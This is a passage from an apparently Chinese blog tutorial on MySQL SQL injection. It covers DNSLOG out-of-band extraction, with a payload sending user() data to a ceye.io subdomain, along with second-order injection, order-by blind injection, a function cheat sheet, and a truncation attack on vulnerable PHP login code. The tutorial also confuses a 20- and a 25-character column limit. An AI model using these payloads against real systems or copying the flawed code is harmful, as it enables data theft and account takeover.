<h4 id="0x08-DNSLOG带出数据"><a href="#0x08-DNSLOG带出数据" class="headerlink" title="0x08.DNSLOG带出数据"></a>0x08.DNSLOG带出数据</h4><h6 id="什么是DNSLOG？简单的说，就是关于特定网站的DNS查询的一份记录表。若A用户对B网站进行访问-请求等操作，首先会去查询B网站的DNS记录，由于B网站是被我们控制的，便可以通过某些方法记录下A用户对于B网站的DNS记录信息。此方法也称为OOB注入。"><a href="#什么是DNSLOG？简单的说，就是关于特定网站的DNS查询的一份记录表。若A用户对B网站进行访问-请求等操作，首先会去查询B网站的DNS记录，由于B网站是被我们控制的，便可以通过某些方法记录下A用户对于B网站的DNS记录信息。此方法也称为OOB注入。" class="headerlink" title="什么是DNSLOG？简单的说，就是关于特定网站的DNS查询的一份记录表。若A用户对B网站进行访问/请求等操作，首先会去查询B网站的DNS记录，由于B网站是被我们控制的，便可以通过某些方法记录下A用户对于B网站的DNS记录信息。此方法也称为OOB注入。"></a>什么是DNSLOG？简单的说，就是关于特定网站的DNS查询的一份记录表。若A用户对B网站进行访问/请求等操作，首先会去查询B网站的DNS记录，由于B网站是被我们控制的，便可以通过某些方法记录下A用户对于B网站的DNS记录信息。此方法也称为OOB注入。</h6><h6 id="如何用DNSLOG带出数据？若我们想要查询的数据为：aabbcc，那么我们让mysql服务端去请求aabbcc-evil-com，通过记录evil-com的DNS记录，就可以得到数据：aabbcc。"><a href="#如何用DNSLOG带出数据？若我们想要查询的数据为：aabbcc，那么我们让mysql服务端去请求aabbcc-evil-com，通过记录evil-com的DNS记录，就可以得到数据：aabbcc。" class="headerlink" title="如何用DNSLOG带出数据？若我们想要查询的数据为：aabbcc，那么我们让mysql服务端去请求aabbcc.evil.com，通过记录evil.com的DNS记录，就可以得到数据：aabbcc。"></a>如何用DNSLOG带出数据？若我们想要查询的数据为：<code>aabbcc</code>，那么我们让mysql服务端去请求<code>aabbcc.evil.com</code>，通过记录<code>evil.com</code>的DNS记录，就可以得到数据：<code>aabbcc</code>。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/sql-6.jpg" alt></p>
<h6 id="引自：Dnslog在SQL注入中的实战"><a href="#引自：Dnslog在SQL注入中的实战" class="headerlink" title="引自：Dnslog在SQL注入中的实战"></a>引自：<a href="https://www.anquanke.com/post/id/98096" target="_blank" rel="noopener">Dnslog在SQL注入中的实战</a></h6><h6 id="payload-load-file-concat-39-39-select-user-39-xxxx-ceye-io-xxxx-39-。"><a href="#payload-load-file-concat-39-39-select-user-39-xxxx-ceye-io-xxxx-39-。" class="headerlink" title="payload:load_file(concat(&#39;\\\\&#39;,(select user()),&#39;.xxxx.ceye.io\xxxx&#39;))。"></a>payload:<code>load_file(concat(&#39;\\\\&#39;,(select user()),&#39;.xxxx.ceye.io\xxxx&#39;))</code>。</h6><h6 id="应用场景："><a href="#应用场景：" class="headerlink" title="应用场景："></a>应用场景：</h6><ul>
<li>三大注入无法使用</li>
<li>有文件读取权限及secure-file-priv无值。</li>
<li>不知道网站/目标文件/目标目录的绝对路径</li>
<li>目标系统为Windows</li>
</ul>
<h6 id="推荐平台：ceye-io"><a href="#推荐平台：ceye-io" class="headerlink" title="推荐平台：ceye.io"></a>推荐平台：<a href="http://ceye.io/" target="_blank" rel="noopener">ceye.io</a></h6><h6 id="为什么Windows可用，Linux不行？这里涉及到一个叫UNC的知识点。简单的说，在Windows中，路径以-开头的路径在Windows中被定义为UNC路径，相当于网络硬盘一样的存在，所以我们填写域名的话，Windows会先进行DNS查询。但是对于Linux来说，并没有这一标准，所以DNSLOG在Linux环境不适用。注：payload里的四个-中的两个-是用来进行转义处理的。"><a href="#为什么Windows可用，Linux不行？这里涉及到一个叫UNC的知识点。简单的说，在Windows中，路径以-开头的路径在Windows中被定义为UNC路径，相当于网络硬盘一样的存在，所以我们填写域名的话，Windows会先进行DNS查询。但是对于Linux来说，并没有这一标准，所以DNSLOG在Linux环境不适用。注：payload里的四个-中的两个-是用来进行转义处理的。" class="headerlink" title="为什么Windows可用，Linux不行？这里涉及到一个叫UNC的知识点。简单的说，在Windows中，路径以\\开头的路径在Windows中被定义为UNC路径，相当于网络硬盘一样的存在，所以我们填写域名的话，Windows会先进行DNS查询。但是对于Linux来说，并没有这一标准，所以DNSLOG在Linux环境不适用。注：payload里的四个\\\\中的两个\是用来进行转义处理的。"></a>为什么Windows可用，Linux不行？这里涉及到一个叫UNC的知识点。简单的说，在Windows中，路径以<code>\\</code>开头的路径在Windows中被定义为UNC路径，相当于网络硬盘一样的存在，所以我们填写域名的话，Windows会先进行DNS查询。但是对于Linux来说，并没有这一标准，所以DNSLOG在Linux环境不适用。注：payload里的四个<code>\\\\</code>中的两个<code>\</code>是用来进行转义处理的。</h6><h4 id="0x09-二次注入"><a href="#0x09-二次注入" class="headerlink" title="0x09.二次注入"></a>0x09.二次注入</h4><h6 id="什么是二次注入？简单的说，就是攻击者构造的恶意payload首先会被服务器存储在数据库中，在之后取出数据库在进行SQL语句拼接时产生的SQL注入问题。"><a href="#什么是二次注入？简单的说，就是攻击者构造的恶意payload首先会被服务器存储在数据库中，在之后取出数据库在进行SQL语句拼接时产生的SQL注入问题。" class="headerlink" title="什么是二次注入？简单的说，就是攻击者构造的恶意payload首先会被服务器存储在数据库中，在之后取出数据库在进行SQL语句拼接时产生的SQL注入问题。"></a>什么是二次注入？简单的说，就是攻击者构造的恶意payload首先会被服务器存储在数据库中，在之后取出数据库在进行SQL语句拼接时产生的SQL注入问题。</h6><h6 id="举个例子，某个查询当先登录的用户信息的SQL语句如下："><a href="#举个例子，某个查询当先登录的用户信息的SQL语句如下：" class="headerlink" title="举个例子，某个查询当先登录的用户信息的SQL语句如下："></a>举个例子，某个查询当先登录的用户信息的SQL语句如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&apos;$_SESSION[&apos;username&apos;]&apos;</span><br></pre></td></tr></table></figure>

<h6 id="登录-注册处的SQL语句都经过了addslashes函数、单引号闭合的处理，且无编码产生的问题。"><a href="#登录-注册处的SQL语句都经过了addslashes函数、单引号闭合的处理，且无编码产生的问题。" class="headerlink" title="登录/注册处的SQL语句都经过了addslashes函数、单引号闭合的处理，且无编码产生的问题。"></a>登录/注册处的SQL语句都经过了addslashes函数、单引号闭合的处理，且无编码产生的问题。</h6><h6 id="对于上述举的语句我们可以先注册一个名为admin-39-的用户名，因为在注册进行了单引号的转义，故我们并不能直接进行insert注入，最终将我们的用户名存储在了服务器中，注意：反斜杠转义掉了单引号，在mysql中得到的数据并没有反斜杠的存在。"><a href="#对于上述举的语句我们可以先注册一个名为admin-39-的用户名，因为在注册进行了单引号的转义，故我们并不能直接进行insert注入，最终将我们的用户名存储在了服务器中，注意：反斜杠转义掉了单引号，在mysql中得到的数据并没有反斜杠的存在。" class="headerlink" title="对于上述举的语句我们可以先注册一个名为admin&#39; #的用户名，因为在注册进行了单引号的转义，故我们并不能直接进行insert注入，最终将我们的用户名存储在了服务器中，注意：反斜杠转义掉了单引号，在mysql中得到的数据并没有反斜杠的存在。"></a>对于上述举的语句我们可以先注册一个名为<code>admin&#39; #</code>的用户名，因为在注册进行了单引号的转义，故我们并不能直接进行insert注入，最终将我们的用户名存储在了服务器中，注意：反斜杠转义掉了单引号，在mysql中得到的数据并没有反斜杠的存在。</h6><h6 id="在我们进行登录操作的时候，我们用注册的admin-39-登录系统，并将用户部分数据存储在对于的SESSION中，如-SESSION-39-username-39-。"><a href="#在我们进行登录操作的时候，我们用注册的admin-39-登录系统，并将用户部分数据存储在对于的SESSION中，如-SESSION-39-username-39-。" class="headerlink" title="在我们进行登录操作的时候，我们用注册的admin&#39; #登录系统，并将用户部分数据存储在对于的SESSION中，如$_SESSION[&#39;username&#39;]。"></a>在我们进行登录操作的时候，我们用注册的<code>admin&#39; #</code>登录系统，并将用户部分数据存储在对于的SESSION中，如<code>$_SESSION[&#39;username&#39;]</code>。</h6><h6 id="上述的-SESSION-39-username-39-并没有经过处理，直接拼接到了SQL语句之中，就会造成SQL注入，最终的语句为："><a href="#上述的-SESSION-39-username-39-并没有经过处理，直接拼接到了SQL语句之中，就会造成SQL注入，最终的语句为：" class="headerlink" title="上述的$_SESSION[&#39;username&#39;]并没有经过处理，直接拼接到了SQL语句之中，就会造成SQL注入，最终的语句为："></a>上述的<code>$_SESSION[&#39;username&#39;]</code>并没有经过处理，直接拼接到了SQL语句之中，就会造成SQL注入，最终的语句为：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&apos;admin&apos; #&apos;</span><br></pre></td></tr></table></figure>

<h4 id="0x10-order-by比较盲注"><a href="#0x10-order-by比较盲注" class="headerlink" title="0x10.order by比较盲注"></a>0x10.order by比较盲注</h4><h6 id="这种方法运用的情况比较极端一些，如布尔盲注时，字符截取-比较限制很严格。例子："><a href="#这种方法运用的情况比较极端一些，如布尔盲注时，字符截取-比较限制很严格。例子：" class="headerlink" title="这种方法运用的情况比较极端一些，如布尔盲注时，字符截取/比较限制很严格。例子："></a>这种方法运用的情况比较极端一些，如布尔盲注时，字符截取/比较限制很严格。例子：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where (select &apos;r&apos; union select user() order by 1 limit 1)=&apos;r&apos;</span><br></pre></td></tr></table></figure>

<h6 id="实际上此处是利用了order-by语句的排序功能来进行判断的。若我们想要查询的数据开头的首字母在字母表的位值比我们判断的值要靠后，则limit语句将不会让其输出，那么整个条件将会成立，否之不成立。"><a href="#实际上此处是利用了order-by语句的排序功能来进行判断的。若我们想要查询的数据开头的首字母在字母表的位值比我们判断的值要靠后，则limit语句将不会让其输出，那么整个条件将会成立，否之不成立。" class="headerlink" title="实际上此处是利用了order by语句的排序功能来进行判断的。若我们想要查询的数据开头的首字母在字母表的位值比我们判断的值要靠后，则limit语句将不会让其输出，那么整个条件将会成立，否之不成立。"></a>实际上此处是利用了<code>order by</code>语句的排序功能来进行判断的。若我们想要查询的数据开头的首字母在字母表的位值比我们判断的值要靠后，则limit语句将不会让其输出，那么整个条件将会成立，否之不成立。</h6><h6 id="利用这种方法可以做到不需要使用like、rlike、regexp等匹配语句以及字符操作函数。"><a href="#利用这种方法可以做到不需要使用like、rlike、regexp等匹配语句以及字符操作函数。" class="headerlink" title="利用这种方法可以做到不需要使用like、rlike、regexp等匹配语句以及字符操作函数。"></a>利用这种方法可以做到不需要使用<code>like、rlike、regexp</code>等匹配语句以及字符操作函数。</h6><h6 id="再举个例子："><a href="#再举个例子：" class="headerlink" title="再举个例子："></a>再举个例子：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,flag,password from users where username=&apos;$username;&apos;</span><br></pre></td></tr></table></figure>

<h6 id="页面回显的字段为：username与password，如何在union与flag两单词被拦截、无报错信息返回的情况下获取到用户名为admin的flag值？"><a href="#页面回显的字段为：username与password，如何在union与flag两单词被拦截、无报错信息返回的情况下获取到用户名为admin的flag值？" class="headerlink" title="页面回显的字段为：username与password，如何在union与flag两单词被拦截、无报错信息返回的情况下获取到用户名为admin的flag值？"></a>页面回显的字段为：username与password，如何在<code>union</code>与<code>flag</code>两单词被拦截、无报错信息返回的情况下获取到用户名为<code>admin</code>的flag值？</h6><h6 id="我们前边讲到了无列名注入，通过使用union语句来对未知列名进行重命名的形式绕过，还讲过通过使用join-using-报错注入出列名。但现在，这两种方法都不可以的情况下该如何获取到flag字段的内容？"><a href="#我们前边讲到了无列名注入，通过使用union语句来对未知列名进行重命名的形式绕过，还讲过通过使用join-using-报错注入出列名。但现在，这两种方法都不可以的情况下该如何获取到flag字段的内容？" class="headerlink" title="我们前边讲到了无列名注入，通过使用union语句来对未知列名进行重命名的形式绕过，还讲过通过使用join using()报错注入出列名。但现在，这两种方法都不可以的情况下该如何获取到flag字段的内容？"></a>我们前边讲到了无列名注入，通过使用<code>union</code>语句来对未知列名进行重命名的形式绕过，还讲过通过使用<code>join using()</code>报错注入出列名。但现在，这两种方法都不可以的情况下该如何获取到flag字段的内容？</h6><h6 id="使用order-by可轻松盲注出答案。payload："><a href="#使用order-by可轻松盲注出答案。payload：" class="headerlink" title="使用order by可轻松盲注出答案。payload："></a>使用<code>order by</code>可轻松盲注出答案。payload：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,flag,password from users where username=&apos;admin&apos; union select 1,&apos;a&apos;,3 order by 2</span><br></pre></td></tr></table></figure>

<h6 id="与之前的原理相同，通过判断前后两个select语句返回的数据前后顺序来进行盲注。"><a href="#与之前的原理相同，通过判断前后两个select语句返回的数据前后顺序来进行盲注。" class="headerlink" title="与之前的原理相同，通过判断前后两个select语句返回的数据前后顺序来进行盲注。"></a>与之前的原理相同，通过判断前后两个select语句返回的数据前后顺序来进行盲注。</h6><h4 id="0x11-常见函数-符号归类"><a href="#0x11-常见函数-符号归类" class="headerlink" title="0x11.常见函数/符号归类"></a>0x11.常见函数/符号归类</h4><h5 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h5><table>
<thead>
<tr>
<th align="center">单行注释</th>
<th align="center">单行注释</th>
<th align="center">单行注释</th>
<th align="center">多行(内联)注释</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>#</code></td>
<td align="center"><code>-- x //x为任意字符</code></td>
<td align="center"><code>;%00</code></td>
<td align="center"><code>/*任意内容*/</code></td>
</tr>
</tbody></table>
<h5 id="常用运算符"><a href="#常用运算符" class="headerlink" title="常用运算符"></a>常用运算符</h5><table>
<thead>
<tr>
<th align="center">运算符</th>
<th align="center">说明</th>
<th align="center">运算符</th>
<th align="center">说明</th>
<th align="center"></th>
</tr>
</thead>
<tbody><tr>
<td align="center">&amp;&amp;</td>
<td align="center">与，同and。</td>
<td align="center">|    |    或，同or。</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">!</td>
<td align="center">非，同not。</td>
<td align="center">~</td>
<td align="center">一元比特反转。</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">^</td>
<td align="center">异或，同xor。</td>
<td align="center">+</td>
<td align="center">加，可替代空格，如<code>select+user()</code></td>
<td align="center"></td>
</tr>
</tbody></table>
<h5 id="系统信息函数"><a href="#系统信息函数" class="headerlink" title="系统信息函数"></a>系统信息函数</h5><table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">USER()</td>
<td align="center">获取当前操作句柄的用户名，同SESSION_USER()、CURRENT_USER()，有时也用SYSTEM_USER()。</td>
</tr>
<tr>
<td align="center">DATABASE()</td>
<td align="center">获取当前选择的数据库名，同SCHEMA()。</td>
</tr>
<tr>
<td align="center">VERSION()</td>
<td align="center">获取当前版本信息。</td>
</tr>
</tbody></table>
<h5 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h5><table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">ORD(str)</td>
<td align="center">返回字符串第一个字符的ASCII值。</td>
</tr>
<tr>
<td align="center">OCT(N)</td>
<td align="center">以字符串形式返回 <code>N</code> 的八进制数，<code>N</code> 是一个BIGINT 型数值，作用相当于<code>CONV(N,10,8)</code>。</td>
</tr>
<tr>
<td align="center">HEX(N_S)</td>
<td align="center">参数为字符串时，返回 <code>N_or_S</code> 的16进制字符串形式，为数字时，返回其16进制数形式。</td>
</tr>
<tr>
<td align="center">UNHEX(str)</td>
<td align="center"><code>HEX(str)</code> 的逆向函数。将参数中的每一对16进制数字都转换为10进制数字，然后再转换成 ASCII 码所对应的字符。</td>
</tr>
<tr>
<td align="center">BIN(N)</td>
<td align="center">返回十进制数值 <code>N</code> 的二进制数值的字符串表现形式。</td>
</tr>
<tr>
<td align="center">ASCII(str)</td>
<td align="center">同<code>ORD(string)</code>。</td>
</tr>
<tr>
<td align="center">CONV(N,from_base,to_base)</td>
<td align="center">将数值型参数<code>N</code>由初始进制<code>from_base</code>转换为目标进制<code>to_base</code>的形式并返回。</td>
</tr>
<tr>
<td align="center">CHAR(N,… [USING charset_name])</td>
<td align="center">将每一个参数<code>N</code>都解释为整数，返回由这些整数在 ASCII 码中所对应字符所组成的字符串。</td>
</tr>
</tbody></table>
<h5 id="字符截取-拼接"><a href="#字符截取-拼接" class="headerlink" title="字符截取/拼接"></a>字符截取/拼接</h5><table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">SUBSTR(str,N_start,N_length)</td>
<td align="center">对指定字符串进行截取，为SUBSTRING的简单版。</td>
</tr>
<tr>
<td align="center">SUBSTRING()</td>
<td align="center">多种格式<code>SUBSTRING(str,pos)、SUBSTRING(str FROM pos)、SUBSTRING(str,pos,len)、SUBSTRING(str FROM pos FOR len)</code>。</td>
</tr>
<tr>
<td align="center">RIGHT(str,len)</td>
<td align="center">对指定字符串从<code>最右边</code>截取指定长度。</td>
</tr>
<tr>
<td align="center">LEFT(str,len)</td>
<td align="center">对指定字符串从<code>最左边</code>截取指定长度。</td>
</tr>
<tr>
<td align="center">RPAD(str,len,padstr)</td>
<td align="center">在 <code>str</code> 右方补齐 <code>len</code> 位的字符串 <code>padstr</code>，返回新字符串。如果 <code>str</code> 长度大于 <code>len</code>，则返回值的长度将缩减到 <code>len</code> 所指定的长度。</td>
</tr>
<tr>
<td align="center">LPAD(str,len,padstr)</td>
<td align="center">与RPAD相似，在<code>str</code>左边补齐。</td>
</tr>
<tr>
<td align="center">MID(str,pos,len)</td>
<td align="center">同于 <code>SUBSTRING(str,pos,len)</code>。</td>
</tr>
<tr>
<td align="center">INSERT(str,pos,len,newstr)</td>
<td align="center">在原始字符串 <code>str</code> 中，将自左数第 <code>pos</code> 位开始，长度为 <code>len</code> 个字符的字符串替换为新字符串 <code>newstr</code>，然后返回经过替换后的字符串。<code>INSERT(str,len,1,0x0)</code>可当做截取函数。</td>
</tr>
<tr>
<td align="center">CONCAT(str1,str2…)</td>
<td align="center">函数用于将多个字符串合并为一个字符串</td>
</tr>
<tr>
<td align="center">GROUP_CONCAT(…)</td>
<td align="center">返回一个字符串结果，该结果由分组中的值连接组合而成。</td>
</tr>
<tr>
<td align="center">MAKE_SET(bits,str1,str2,…)</td>
<td align="center">根据参数1，返回所输入其他的参数值。可用作布尔盲注，如：<code>EXP(MAKE_SET((LENGTH(DATABASE())&gt;8)+1,&#39;1&#39;,&#39;710&#39;))</code>。</td>
</tr>
</tbody></table>
<h5 id="常见全局变量"><a href="#常见全局变量" class="headerlink" title="常见全局变量"></a>常见全局变量</h5><table>
<thead>
<tr>
<th align="center">变量</th>
<th align="center">说明</th>
<th align="center">变量</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">@@VERSION</td>
<td align="center">返回版本信息</td>
<td align="center">@@HOSTNAME</td>
<td align="center">返回安装的计算机名称</td>
</tr>
<tr>
<td align="center">@@GLOBAL.VERSION</td>
<td align="center">同<code>@@VERSION</code></td>
<td align="center">@@BASEDIR</td>
<td align="center">返回MYSQL绝对路径</td>
</tr>
</tbody></table>
<h6 id="PS：查看全部全局变量SHOW-GLOBAL-VARIABLES-。"><a href="#PS：查看全部全局变量SHOW-GLOBAL-VARIABLES-。" class="headerlink" title="PS：查看全部全局变量SHOW GLOBAL VARIABLES;。"></a>PS：查看全部全局变量<code>SHOW GLOBAL VARIABLES;</code>。</h6><h5 id="其他常用函数-语句"><a href="#其他常用函数-语句" class="headerlink" title="其他常用函数/语句"></a>其他常用函数/语句</h5><table>
<thead>
<tr>
<th align="center">函数/语句</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">LENGTH(str)</td>
<td align="center">返回字符串的长度。</td>
</tr>
<tr>
<td align="center">PI()</td>
<td align="center">返回π的具体数值。</td>
</tr>
<tr>
<td align="center">REGEXP “statement”</td>
<td align="center">正则匹配数据，返回值为布尔值。</td>
</tr>
<tr>
<td align="center">LIKE “statement”</td>
<td align="center">匹配数据，%代表任意内容。返回值为布尔值。</td>
</tr>
<tr>
<td align="center">RLIKE “statement”</td>
<td align="center">与regexp相同。</td>
</tr>
<tr>
<td align="center">LOCATE(substr,str,[pos])</td>
<td align="center">返回子字符串第一次出现的位置。</td>
</tr>
<tr>
<td align="center">POSITION(substr IN str)</td>
<td align="center">等同于 <code>LOCATE()</code>。</td>
</tr>
<tr>
<td align="center">LOWER(str)</td>
<td align="center">将字符串的大写字母全部转成小写。同：<code>LCASE(str)</code>。</td>
</tr>
<tr>
<td align="center">UPPER(str)</td>
<td align="center">将字符串的小写字母全部转成大写。同：<code>UCASE(str)</code>。</td>
</tr>
<tr>
<td align="center">ELT(N,str1,str2,str3,…)</td>
<td align="center">与<code>MAKE_SET(bit,str1,str2...)</code>类似，根据<code>N</code>返回参数值。</td>
</tr>
<tr>
<td align="center">NULLIF(expr1,expr2)</td>
<td align="center">若expr1与expr2相同，则返回expr1，否则返回NULL。</td>
</tr>
<tr>
<td align="center">CHARSET(str)</td>
<td align="center">返回字符串使用的字符集。</td>
</tr>
<tr>
<td align="center">DECODE(crypt_str,pass_str)</td>
<td align="center">使用 pass_str 作为密码，解密加密字符串 crypt_str。加密函数：<code>ENCODE(str,pass_str)</code>。</td>
</tr>
</tbody></table>
<h4 id="0x12-约束攻击"><a href="#0x12-约束攻击" class="headerlink" title="0x12.约束攻击"></a>0x12.约束攻击</h4><h6 id="什么是约束攻击？"><a href="#什么是约束攻击？" class="headerlink" title="什么是约束攻击？"></a>什么是约束攻击？</h6><h6 id="仍然是先举个例子："><a href="#仍然是先举个例子：" class="headerlink" title="仍然是先举个例子："></a>仍然是先举个例子：</h6><h6 id="我们先通过下列语句建立一个用户表"><a href="#我们先通过下列语句建立一个用户表" class="headerlink" title="我们先通过下列语句建立一个用户表"></a>我们先通过下列语句建立一个用户表</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE users(</span><br><span class="line">    username varchar(20),</span><br><span class="line">    password varchar(20)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h6 id="注册代码："><a href="#注册代码：" class="headerlink" title="注册代码："></a>注册代码：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn = mysqli_connect(<span class="string">"127.0.0.1:3306"</span>, <span class="string">"root"</span>, <span class="string">"ljdd520"</span>, <span class="string">"db"</span>);</span><br><span class="line"><span class="keyword">if</span> (!$conn) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Connection failed: "</span> . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">$username = addslashes(@$_POST[<span class="string">'username'</span>]);</span><br><span class="line">$password = addslashes(@$_POST[<span class="string">'password'</span>]);</span><br><span class="line">$sql = <span class="string">"select * from users where username = '$username'"</span>;</span><br><span class="line">$rs = mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">if</span>($rs-&gt;fetch_row())&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'账号已注册'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $sql2 = <span class="string">"insert into users values('$username','$password')"</span>;</span><br><span class="line">    mysqli_query($conn,$sql2);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'注册成功'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="登录判断代码："><a href="#登录判断代码：" class="headerlink" title="登录判断代码："></a>登录判断代码：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn = mysqli_connect(<span class="string">"127.0.0.1:3306"</span>, <span class="string">"root"</span>, <span class="string">"ljdd520"</span>, <span class="string">"db"</span>);</span><br><span class="line"><span class="keyword">if</span> (!$conn) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Connection failed: "</span> . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">$username = addslashes(@$_POST[<span class="string">'username'</span>]);</span><br><span class="line">$password = addslashes(@$_POST[<span class="string">'password'</span>]);</span><br><span class="line">$sql = <span class="string">"select * from users where username = '$username' and password='$password';"</span>;</span><br><span class="line">$rs = mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">if</span>($rs-&gt;fetch_row())&#123;</span><br><span class="line">    $_SESSION[<span class="string">'username'</span>]=$password;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"fail"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="在无编码问题，且进行了单引号的处理情况下仍可能发生什么SQL注入问题呢？"><a href="#在无编码问题，且进行了单引号的处理情况下仍可能发生什么SQL注入问题呢？" class="headerlink" title="在无编码问题，且进行了单引号的处理情况下仍可能发生什么SQL注入问题呢？"></a>在无编码问题，且进行了单引号的处理情况下仍可能发生什么SQL注入问题呢？</h6><h6 id="我们注意到，前边创建表格的语句限制了username和password的长度最大为25，若我们插入数据超过25，MYSQL会怎样处理呢？答案是MYSQL会截取前边的25个字符进行插入。"><a href="#我们注意到，前边创建表格的语句限制了username和password的长度最大为25，若我们插入数据超过25，MYSQL会怎样处理呢？答案是MYSQL会截取前边的25个字符进行插入。" class="headerlink" title="我们注意到，前边创建表格的语句限制了username和password的长度最大为25，若我们插入数据超过25，MYSQL会怎样处理呢？答案是MYSQL会截取前边的25个字符进行插入。"></a>我们注意到，前边创建表格的语句限制了username和password的长度最大为25，若我们插入数据超过25，MYSQL会怎样处理呢？答案是MYSQL会截取前边的25个字符进行插入。</h6><h6 id="而对于SELECT查询请求，若查询的数据超过25长度，也不会进行截取操作，这就产生了一个问题。"><a href="#而对于SELECT查询请求，若查询的数据超过25长度，也不会进行截取操作，这就产生了一个问题。" class="headerlink" title="而对于SELECT查询请求，若查询的数据超过25长度，也不会进行截取操作，这就产生了一个问题。"></a>而对于<code>SELECT</code>查询请求，若查询的数据超过25长度，也不会进行截取操作，这就产生了一个问题。</h6><h6 id="通常对于注册处的代码来说，需要先判断注册的用户名是否存在，再进行插入数据操作。如我们注册一个username-admin-25个空格-x-amp-password-123456的账号，服务器会先查询admin-25个空格-x的用户是否存在，若存在，则不能注册。若不存在，则进行插入数据的操作。而此处我们限制了username与password字段长度最大为25，所以我们实际插入的数据为username-admin-20个空格-amp-password-123456。"><a href="#通常对于注册处的代码来说，需要先判断注册的用户名是否存在，再进行插入数据操作。如我们注册一个username-admin-25个空格-x-amp-password-123456的账号，服务器会先查询admin-25个空格-x的用户是否存在，若存在，则不能注册。若不存在，则进行插入数据的操作。而此处我们限制了username与password字段长度最大为25，所以我们实际插入的数据为username-admin-20个空格-amp-password-123456。" class="headerlink" title="通常对于注册处的代码来说，需要先判断注册的用户名是否存在，再进行插入数据操作。如我们注册一个username=admin[25个空格]x&amp;password=123456的账号，服务器会先查询admin[25个空格]x的用户是否存在，若存在，则不能注册。若不存在，则进行插入数据的操作。而此处我们限制了username与password字段长度最大为25，所以我们实际插入的数据为username=admin[20个空格]&amp;password=123456。"></a>通常对于注册处的代码来说，需要先判断注册的用户名是否存在，再进行插入数据操作。如我们注册一个<code>username=admin[25个空格]x&amp;password=123456</code>的账号，服务器会先查询<code>admin[25个空格]x</code>的用户是否存在，若存在，则不能注册。若不存在，则进行插入数据的操作。而此处我们限制了username与password字段长度最大为25，所以我们实际插入的数据为<code>username=admin[20个空格]&amp;password=123456</code>。</h6><h6 id="接着进行登录的时，我们使用：username-admin-amp-password-123456进行登录，即可成功登录admin的账号。"><a href="#接着进行登录的时，我们使用：username-admin-amp-password-123456进行登录，即可成功登录admin的账号。" class="headerlink" title="接着进行登录的时，我们使用：username=admin&amp;password=123456进行登录，即可成功登录admin的账号。"></a>接着进行登录的时，我们使用：<code>username=admin&amp;password=123456</code>进行登录，即可成功登录admin的账号。</h6><h6 id="例如：-13"><a href="#例如：-13" class="headerlink" title="例如："></a>例如：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select &apos;admin&apos;=&apos;admin                    &apos;;</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| &apos;admin&apos;=&apos;admin                    &apos; |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">|                                   1 |</span><br><span 